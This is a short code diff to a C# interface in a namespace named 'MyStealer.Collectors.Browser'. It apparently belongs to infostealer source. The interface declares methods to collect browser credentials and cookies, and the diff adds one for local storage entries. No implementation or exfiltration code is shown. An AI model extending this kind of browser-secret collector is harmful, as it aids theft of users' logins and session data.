@@ -6,5 +6,6 @@ namespace MyStealer.Collectors.Browser
     {
         ISet<CredentialEntry> GetCredentials();
         ISet<CookieEntry> GetCookies();
+        ISet<LocalStorageEntry> GetLocalStorageEntries();
     }
 }
